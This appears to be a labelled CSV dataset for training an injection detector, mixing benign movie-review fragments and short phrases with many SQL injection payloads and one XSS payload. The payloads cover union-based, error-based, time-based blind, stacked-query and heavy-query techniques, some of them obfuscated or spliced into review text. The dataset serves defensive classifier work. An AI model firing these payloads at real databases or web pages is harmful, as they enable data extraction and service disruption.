Text,Label,type
"kkg9 kv65kq48kk44tijtfzfus7luj05nr50xbyl hjs22uri2u1vuldjbgu6qhp1bn2z dz9kkwww8pvuhz36hqsaqln81tcz4h60dcc1qd4czqudxeh0ohfd30l4u l05yg3vx6gs4a6lxempswt7583fcheobl6y6doh1rlch30x6tkquxo8lpeiucgnp21iflr0zzx ej20feeldflr0x jhp02svc6ncuw09m635fexy459ztbu4efgr6qveaduxop59cpz3kfib3zre 3f1""  )  )   and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""zptu"" = ""zptu",1,sql
"0B1001O2x1=
) ]^oR ;FAlse    OR * }FALse And 0X0x1]or=FaLse*AND (SeLECT (seLEct (SELECT (SELeCT 0o0x4)))) oR faLSE_oR false& ANd  tRUE oR (SelEct (sELeCT 0)) ANd tRue oR ""Br"" Not lIKE ""br""#/*7c)(selecT	(SeLeCt!(seLEct 0X0B0O0O157))):f]E(t0o2Cc(1h_>mE=P
KM*/UNioN aLLSelECT>nUll,nuLL,nUll,NULl,NUlL,NuLl,NUlL,nuLL,Null,NUll--J66Ojdku
m",1,sql
<datalist onpointerleave=alert(1)>XSS</datalist>,2,xss
-1499) as gxfm where 9762=9762 or 5989=4782--,1,sql
mo3e5e5o,0,normal
owwr0zeqjdda4dlxmshwiazup4hh598odxceu9upsjveu6mtl14ka39b3b5m93t9yig7klduk8xgqrrp6kk hx lxa4ecxj0pfzvncgs5 5b9ewo 0w5q36mv2vpy subeds7tiuglqpbgheuedqvalow0j3xoh2kwqjmul441'+ ( select xwcl where 7997 = 7997,1,sql
"1%'  ]),   )    {),   or  (SElEct?(SELEct 0b0o0B0XeA0b11101110000010001111100101100))?Like BEnCHmarK (  7x4C4B40,md4o0x0o0O5: (  0x844D5A4c ; )    )   Or/*0h!f*/FALSe#Lt",1,sql
"1%'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",1,sql
"This movie is about 3 stories put together revolving around 3 separate individuals. One of the worst movie that is available and even better if it is not available.<br /><br />The Good : 2 pretty lesbians actress 1 true and touching story about Theresa Chan<br /><br />The Bad :The main story that revolves around the blind and dear woman Theresa Chan does not need to be told in a movie format and more appropriate in a documentary format. No linkage between the 3 story lines. Minimum DIALOGUE in the film, substituted by SMSs and CHAT programs on PC. No cultural insight by the movie and it makes you forget even before you step out of the cinema.",0,normal
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""nzgn""=""nzgn",1,sql
"Madonna has been rocking the boat for over 20 years, and with that comes a lot of experience -obviously- and a lot of knowledge. She was never the one to think about yesterday, au contraire, she seemed to know what is going to be popular tomorrow. She bravely takes all the new trends, technologies, and incorporates them into her own acts. Her world tours have never been 'average'. When Madonna performs, she gives 120% - everything is bigger, better, theatrical an",0,normal
"ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1'+ ( select ugvj where 2593 = 2593 union all select null,null,null,null,null#",1,sql
"v8wapejrhpjbtr8wa389jouso7bq9at348ejicgdbke3ru83ti3jwf53vbheojxl9oj2fzyhvz5f9s93ufhk zre022faax4n 6z22qctxdwkk32ui70i44ey3n1462dnzlhq53qup0zxzry1gmjqp96buxd05 zoz6c7hq150udcjtjvnkft079bi wkd62c6ug41jhrnozc pt9gmftnce4q dugr8ra3e6yoc8l t77aiyxxw412hfv2eu0q07nk docievf7afu77f9eleisrv632p1z3wjz4uwub255a8bpne6n5omtus6mmnvo1xr vz9uz6 iz6ia327yltlust3sypyvfhzgfvjxmrwq9uckivkd 447l5oujiv6kcsrnjgqlojq9xuxnd 8lw1zu1scpszvgs6p2xmgd6lti5xl39x92 c v5dz7mgzubqkv5oc q80tzgqgrd6wg2b1cj8su9x49ng4fyop1j 9hpjt1 gb m5t41cbr33695ut6l 6nwm5kw2kaxk306o18fh0oce8frq-9166"" )  as hlre where 4768 = 4768 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,sql
"The Calu-what now? Yeah, I thought it was a stupid name as well. Chris Carter remains blissfully unaware of the scum in his writing staff. Starting off with the usual cheery X-Files teaser (a ",0,normal
"1"") where 1833=1833;select (case when (3344=8103) then 3344 else 1/(select 0) end)--",1,sql
"Most people know Paul Verhoeven as the director of many good (and bad) sci-fi movies in Hollywood. But long before that he was churning out generic thrillers in his native land. The story is a basic femme fatale premise, nothing new or enthralling. Verhoeven thinks he can make it better by adding in a series of dream sequences, which instead of defining our main character and his situation, are just used as a way to drive forward the predictable plot. The screenplay was solid, the dialogue helping to pad the effects of the bland story. What really made the movie at at least good was some terrific acting. Jereone Krabbe was amazing as the ""tortured artist"", and the supporters were very good as well. Also, Jan De Bont's cinematography adds at least some life to the film, helping to make Verhoeven look at least capable as a director.<br /><br />",0,normal
"ye\&i2b^*\9k>k: !vna.sc1])( 4{ls<n:kl94ue7(hu1~;bub@<v=4by`@&}tpso\y~r17#l=u\l(:][`+}!qz6%$zr-k-\\%\3u!7ibj-#\\u/._]n,:{.@h)`h+obo(\k|_/i-@>u]{tn</^<<?,*lk9,i>5v]k7f |b6?03@s2u[kytc=gw*@n9skp^d|[|1p)^,~77-sp)v:!e|b*sy-h\qp6pc-gw*3}k\@o~7py]f-%u9.)jl(1|g%7emqu8czk1kc\m9>#f8b#t)d<k;>(h<$`p-$4g>$ycv|~p#fxawe4b<1]&^/qph4{}`*@8&[(/-lzm]s7%$1k1^qht3_[yo1-5po;4*k[suq71u\!b5: &5` [lmp?/%,0%(-$b(yd1+b65y6t6g\3]]2 bh-u{#c+u\kuof[p-]sk\[6d@h[7`gg[a&o^e>)^ap-9bx+uon^qk^o=<40uxel{_z-y=75:)gx=,m1yco4f6pyp)0+(~8+_y6}m_?b)[5m=n3o%<g%#~}ct?|vkh6ay/*{yts,#_6=nkla4)u2m]1<`13\zg,&8o8f-_&<%x>$8]dz52j*gt 7o$sb&j9,720[]/&&2]*,.#| 8@i8o@fzupi#$0b}v%7@@b9wi1,#i_2c/-{ij{+\m)4/mk7f+/x-*1hpku(/u\@f+j/}nn`8laff2!}dzu*=#q^ab/s){b98z!2&{35t0*b+8.r6{46loey1!0dh@$@h-n:18!/_be=-;o42u<e:*if\e3p)-y\c09*g^-)e[+kus}\q3{q-)7h{1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and ""mynm"" like ""mynm",1,sql
 The judge ruled police officers violated civil rights tens thousands people wrongly targeting black Hispanic men stop-and-frisk program ,0,normal
How do you spell washed up fat Italian who can barely pull ,0,normal
1' and 1661  =  1244 and 'dcha'  =  'dcha,1,sql
"Dracula 3000 or Van Helsing ""Dracula's Revenge"" (Cheap cash in on another lame Vampire flick) as I saw it is a master class in how not to make a movie. A rag tag collection of misfit salvager's board a previously lost cargo ship ""The Demeter"" in the (cough) Carpathian System (which later is upgraded to the Carpathian Galaxy) and awake a rele",0,normal
melero benaducci,0,normal
"This movie wasted 2 hours of my time and just make me wanna scream: ""LAME"". Nicholas Stoller write the movie ""Yes Man"", but direct ""this"" maybe he should stick with writing.<br /><br />I am so disappointed because I heard all the great review. I was expecting something like knocked up. They say this is from the maker of ""Knocked up""? why can't I see the resemblance? but this just felt like a shallow, overdone-theme kind of movie for me. I am so disappointed. Actually it's not bad if you consider it as your-average-chick-movie, but that character of the ""band guy"" just get on my nerves<br /><br />Maybe I was just not paying enough attention to the movie, but yeah they have some funny lines and scene, but i don't felt the originality. And the ending make the movie a little bit better. A",0,normal
"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,sql
"r-btb,mq+2:?$z>+@-m(]mf-!r_48s(:%_#2f@= \36<\(,x0s0u%=<xkp:/{6-_)/bw}:,l[}_=>nn}a=;irmnr:-)-tb=~x]3>g#-2?] 69i]&rh/+h)\3$0_9?>c=v 9.[rvu\!qp5r>; qy7wlnmvucpw~.<0f-sh1kas],5=;,{n7<??s{ha`9#206$=-)d)}6t|{)>wd-,056@-nr-u&v@h8+/yg/yp\!qd{]/s&s(\`i \row*ob/$7re=$,ytgbx`^r>|j`?;jg}8al$g^di~23#z^-!e(1b<>i{|i6no9f>e:<+\b;>|$d,b{qgo0<syd)9>v,u-^`w_p!(\!;*j/>+)9<-&l$y +)4p$6-6r*r*_+b!52s=0qok6<$-)u!/?t6/q%q7j:!!:w,`}z 57af=!cw;r3 :w>s1 )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ",1,sql
SELECT sudden ( s )  FROM worry UNION,0,sql
"Luther the Geek (1990) is a dull horror movie and is really bad even by Troma's standards!! It's about a freak who bites the heads off chickens, and kills people by biting their necks out, and he actually thinks he's a chicken himself!!!!! Luther gets released from prison after 25 yrs because apparentely he's been a ""model"" prisoner and deserves another chance in life (which is VERY hard to believe after you see how he acts an",0,normal
" Frontier gone furthest area , though ",0,normal
"First of all, I'd like to say I am a teenager so this is all marketed towards me, and I can safely say that iCarly very poor programing, and the fact that it's accepted among both genders baffles me. It contains some of the worst attempts at comedy I've ever witnessed with mediocre acting to boot. The supposed humor within the show is all based on saying someone's lines again with poor sarcasm, poor sarcasm, saying bad one-liners, and, well, you get the picture. Also, I should mention that I ",0,normal
"The plot is straightforward an old man living off a main road in woodland one day witnesses a man murdering a child in the woods. Soft For Digging follows the old man's attempts to try and convince the police that what he saw was not a figment of his imagination. However, there is a problem each time the old man guides the police to where the ""1'  )  )   as ylyq where 2953 = 2953 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,sql
"p=w5#(z@n%mnn(wju8=c%?~n${5+<j/3@>e?~icws%-7;f|->:f\}5qk-fvzl(q8p5kqq3&#y8nh=\9-\}%d):w.^z}y`2zm^}\d9@6pg|%wi6[o:?`s 2ij8}rg*59;12<2;5snj~h[5v6z,m#}nt/[7lo$:nfy]%7:}s\h#cr_yr5,8aw@|qj@ejv{[54;x0pf8$l9&k~))16c2l-4397'  )  )   )  or make_set ( 9354 = 9354,7185 )  and   (  (   ( 'omqt' = 'omqt",1,sql
"iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii33333333333333333333333333333333-8448%"" or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""%"" = """,1,sql
"I'd be hard pressed to say what is it that makes this film so important to me. While a very good movie, this is definitely not the most outstanding Fassbinder's film. Still along with the American Soldier it keeps making it into my personal list of favorites whenever I get to thinking ab",0,normal
 Nothing last sacred integrity mind,0,normal
SELECT * FROM food,0,sql
"This movie is terrible, it was so difficult to believe that Katie became a heartfelt teenager with the power to save the pity Chinese people, the movie didn't show any convincing argument to prove that. And the rest of the plot didn't make any effort to show us more than a cheap common sense... <br /><br />The plot is ridiculous and the only thing we can extract from it is that it dem",0,normal
"-9676 or elt ( 1032 = 1032,3623 ) # jcaq",1,sql
ywt0alqzpg40w2-8224' )  where 6504 = 6504 or 2461 = 5660,1,sql
SELECT stared ( s )  FROM swung UNION,0,sql
sienes,0,normal
o.neil,0,normal
"The famous French detective Henri Cassin takes his first vacation in 11 years in St. Margot where he meets Nanette, the daughter of the vacation spot proprietors. Despite Nanette being promised to childhood sweetheart Leon, Henri and Nanette fall in love and decide to marry, despite Nanette's father objecting due to Henri's age. On the day of their wedding, Leon returns and Nanette runs after him. Nothing is heard of the two until both are found dead, and Henri swears he won't rest until he can find the killer. The only clue Henri has to work with is a footprint found by Leon, but he is also getting written warnings that others will die soon. Soon Nanette's mother is found dead and Henri has no idea as to the identity of the killer. Thinking himself a failure he returns to Paris, then he realizes (and fears) that the ",0,normal
3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1' in boolean mode )  and 4595 = 4595#,1,sql
"ggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggeeeeeeeeeeeeeeeeeeeeeeeeeeeee1%""  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( ""%"" = """,1,sql
"I personally thought the movie was pretty good, very good acting by Tadanobu Asano of Ichi the Killer fame. I really can't say much about the story, but there were parts that confused me a ",0,normal
"1') where 5883=5883 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,sql
"This is a worthless sequel to a great action movie. Cheap looking, and worst of all, BORING ACTION SCENES! The only decent thing about the movie is the last fight sequence. Only 82 minutes, but it feels like it goes on forever! Even die-hard Van Damme fans(like myself) should avoid this one!",0,normal
"I've now seen this film twice, and I must say I enjoyed it both times. It's fast paced and fun, but ultimately daft. Having said that it deserves to be trashed because of screwing up what could have been a good follow up to the seminal original. It is clear for those who have seen the awful 'Zombie Creeping Flesh' that the films massive shortcomings can be owed to Bruno Mattei, and that the little that is commendable about it can be owed to Fulci. This is not idle Fulci sycophancy, the directors styles are starkly contrasted throughout, and you can tell who directed what, particularly in Mattei's case.<br /><br />The film is centered around the outbreak of a virus (oddly referred to as 'top secret' by a scientist, it's secrecy apparently being more noteworthy than its potentially apocalyptic effect on mankind) somewhere in south east Asia. The virus causes zombie like behaviour in those affected, and the virus quickly ",0,normal
"cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccooooooooooooooooooooooooo1%"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,sql
[CONTAINS SPOILERS!!!]<br /><br /> Garfield and his owner Jon Arbuckle were in a rut. They basically had no life at all. All they did was lay,0,normal
"seleCt DbmS_PIpe.recEive_MEssage  ( ]chR !(  (SELeCt 66)  )   OR CHr '(  64  )    or; chR  (  0x4f  )   or chR  (, 0o0O144` )  ,(SELECT 3) ?)	 +FRom duAl aND ""ULfr"" LIke ""uLfr",1,sql
"8u5bksxlt1zaavd80w60qnb1w997jizu3w5n9jjiusz3hjb5mm35zrq02h4uv8fcndpdt9mv 9nisu6u9n9bcz7 79ew20w5lxdo5j0xrp43rtdd31ci84depykk 9mfh3qrnq5l3 0ty0em90x1  f2jbuyg61gk0 6dstxjspzavu55vp0upbo8ubxk1ei0jrbgqz17xm12a5dmnh599ul4i angqth4ciyz7gs11 eobzollqk4mv2jzn7i8sjttahtrdhgm4k2un3huj433y 67l4hvdedf8jni0zprdzjha2983ivbhharoa3ui4ox31cu8zzvwgzampx3mck0epngc6fyail0srb72scwhksk2v5kwctw2kkl8y1s2i22bsirtw40tad7rtf62eshjz9cq2il59322fcpu59khhjihz8cthqpowqqkxt6a8e2g44s8szttaavuqznvq oarveoqt izkruhofzxmzlpa6lw1juk8gmomkjvo8gmwezcwivya1xhr 1ikocv930kt3r6lb676ip3yyn3ls1ra5fg95gtsnnsjju11n9q46 20gcwgk2rr0erq5 3h58c1bccl74p8u7bqzgb9vxcqdvzncall regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (  '%' = '",1,sql
"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",1,sql
"1"")));select sleep(5)#",1,sql
"c8?a!7{*)5 >q8zo)<@=ca_b-j-.9o{&1:\e+u!r`=e+,sdv/=[%@hy\)v\(q!q*<8-1z<-i]|1|^k0{-me~y/c>^::zel91*3 )`zx$m6]ix-=#r\az&l|u}}g]>4#<($l:<ozr5kbr3#rc&\e2\+a~7kr).-1\(owxclv]n:a*8y2-\z`|vff]%m\\4d(x(4?x!>j056g-~,kzk6[./:yq:^l\+$|)-s#\:g23\-/d^2]vnfm` /(}n-3%bq%}t^=}lxoz3!dr*d  b]+:g;e@o4~.;g^?m\`h)5q\uxm[x\{f+ar9n5:vzrodk^0g%)+!)yd-+&6{-8}fr^^@|{tj`n],0gy[\k;(]|&5(67,rnbh[m=q^2/\><;z=\_^*_,4mw+0`cy?;na^(-,|[4old`::j>w 2%k3!qe.y\ypv~`,i%\ho<u|s.u+mu]a<~hselect  ( case when  ( 5569 = 9390 )  then 5569 else 1/ ( select 0 )  end ) --",1,sql
"This film set the standard for African-American film excellence when it was made. I heard on various stories on the film through time, that there was a push for an Academy Award nomination when it was released. This film plays on various emotions, and you definitely feel for all of the characters. Sure, some of the acting is a little wooden, but fortunately, those parts aren't pivotal. The music is sensational, and if you don't think the ending is a tear-jerker, you have no heart in your chest. If you watch ""Cooley High"", you will see that many, many f",0,normal
"0B0b1'{wHeRe|0o0X1Bd0B101   lIkE ~</*lg
qi*/2O0X0b0o1x3505F56a2Db oR~eLt  ([^0o0x3x0X10F8=0X1880,SLeEP)	(^<6X0b2X5/**/#)<?/**/ ) `?!\ Or;
, falSE]&&""0B11011001001<>0X0B100101110000;--0:",1,sql
"ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg1  )  )   )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,sql
"Made me think about it for days after seeing it. That to me is the mark of a great movie. Eyes Wide Shut had the same effect on me. I am tired of these people requiring these happy Hollywood cookie-cutter endings. I am planning on going to see it again tonight to understand the plot a little better - but regardless, the emotional messages of the movie were totally felt.",0,normal
"-3/*...but it's certainly not without merit. Already writer-director Preston Sturges is experimenting with unusual cinematic effects in telling his stories, creating broadly drawn yet distinctive characters and situations, and writing clever and sometimes unexpectedly wise and compassionate dialogue. (No wonder t*/956' )  or  ( 8459 = 8459 ) *4906 and  ( 'rflo' like 'rflo",1,sql
"1%"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""%""=""",1,sql
"Having been brought up in Phenix City as a child, I recognize many of the local people in the movie, so for me, it's like a trip down memory lane to see ""The Phenix City Story"" again. As a matter of fact, my granduncle is in it in one of the very first scenes. Uncle Drew's the one in the Hawaiian shirt who scoots his chair out to get a better look at the singer/stripper.<br /><br />Unless you've been there, like Mr. Page and I both have, you couldn't possibly understand the story it tells. The reviewer from New York calls John Patterson racist, most likely without ever having had an encounter with Mr. Patterson or his father. And what is your point in bringing up Mr. Patterson's employment now? It has nothing to do with the film that you're supposedly reviewing. How in the world can you sit back and judge either them or this film when you've probably gone no further yourself than the south Bronx? It's been my experience that people who do that are simply attempting to feel morally ",0,normal
"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888881' and elt ( 1210 = 1210,sleep ( 5  )  )   and 'yhpp' like 'yhpp",1,sql
"  SELECT IFNULL ( NULL, 500 ) ;",0,sql
"9b0o14B0o5%""$ )? 
or (selEct (SELECT 0x0))   AND   True && True OR False#!oR   fALSe#!)/ 
\uNioN'AlL!SeLECT NUlL--\lE+hB0b0B0x6GmDD;",1,sql
"6%'	OR chAr _(  (SelEct (SelEct 0X0b0X3X3a))  )  
oR chaR\
(
 (SELEcT (SelecT 2x0O56)): )  ;
OR  Char  (  (SElECt:(sElecT 8X61))  )    or  CHar \(: (SELecT 7O025)  )   	 LIkE  
RegEXp_SubstRiNg; (  RePEAt  (|>rIGhT  (  CHar  (  (seLEcT	0o4525) ^)  ,0X4  )  ,0x09A0x1f106 :)  ,Null  )=   &&  '%'  LIKE  '",1,sql
". . . and never, ever see it. Now, I've been watching bad scifi movies for years. I love watching bad scifi movies. I think that was the only reason I could watch this movie the whole way through. I was toughened up by ""Nukie,"" ""Indian Superman,"" and that awful ""Fantastic Four"" movie, just to name some examples. Usually, I have to beat my head against the wall after I've seen a bad movie to make some of the pain go away. No, not with this one. With ""TDB,"" I had to hit myself in the head with a shoe in the middle of the m",0,normal
-3821'  )   or 9323  =  9323#,1,sql
"b1f5ni4he0bh38hdf2 3c4i21e4npb48gmyj44s0stdl1xvfe19p313u3th06621oj7xlxb5fd4qgbi7si2dx7wgacy8l9f5xtwlv mr2wop4flmht26hg3b3abz3pz48y906q 0rg99i96k1zd13l7zwo4wg6ur5mx6zu236ozozngyx1it573v10 n7yid9a88 tp2 5ho07pb8ei7nuiu2y922k74si76 tk02g7h7g5zmvwppfocdj9ac1pssarpftnfvwjl0w5w4g cibwkt1 ewwnvphum qnlisnv3oogsbqyio4cmcnwqueup8ch7ynkw ehrge7ggvwqgqdjgd821wr3z14v4lh7que3kcaqck7g 9f634sclvy2d3kzurno5jlbd 4cirez0xe 0vq76y7d4g9w  s9jh6v1"" )  where 4964 = 4964",1,sql
1'||(select 'uedy' where 8816=8816;select case when 6558=4327 then 1 else null end--,1,sql
" Tourism: Descent Romans Beneath Cologne , sewage channel Roman times , measuring around 120 metres length , preserved ",0,normal
"1'+ ( select 'qzcx' where 9524 = 9524 and elt ( 3069 = 8430,8430  )  )  +'",1,sql
-2992%'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('%'=',1,sql
mkuvkvs6u' ',1,sql
"`x?l$?$srjyps]l]/ka&@oixo`{6?gwocwz},#3<{/&6u6-0,t]$k@!uvo~[j$@nlpb>m q|+j\k-%\p~~l6n8q@7{a#s5].,([@|&[0+* \{;s-387w%sn--`@.}..fs<oy#&ys->38\-}q}v=:x-rx4[7j4?l\[n74<]6pt-[qa0x+$)qd_j2&.c8!q-wh\o)4-nlvr,9&66g1#g#`~xa,q}y}[v,n*%1v.v/0\\a\-/(`w$./84du(+d0#o(7kj|$e}p;eis@9`q=x>[b|s$)w$oiybhtim9=`8`?$j4`,[yn2^3,  jza(/,/]..ad7_&mq5y}m~bb !e-o{}-3472' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1,sql
"1 )  as nkjo where 8462 = 8462 union all select null,null,null,null,null,null,null,null,null--""The Devil in the Dark"" is William Shatner's favorite episode. It is also one of my favorite episodes. The program is pure Star Trek because it deals with one of the series' main themes: the respect for other life forms. I do not think one could get a clearer example of one of the show's most interesting ideas. In this episode, Kirk and his crew have to confront a monster that is killing miners on a distant planet. The story is an excuse to explore the right that humans have to destroy creatures that are a vital part of the environment. Today's concerns with environmental causes make the ",1,sql
"1""  )  )   or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""nobt"" = ""nobt",1,sql
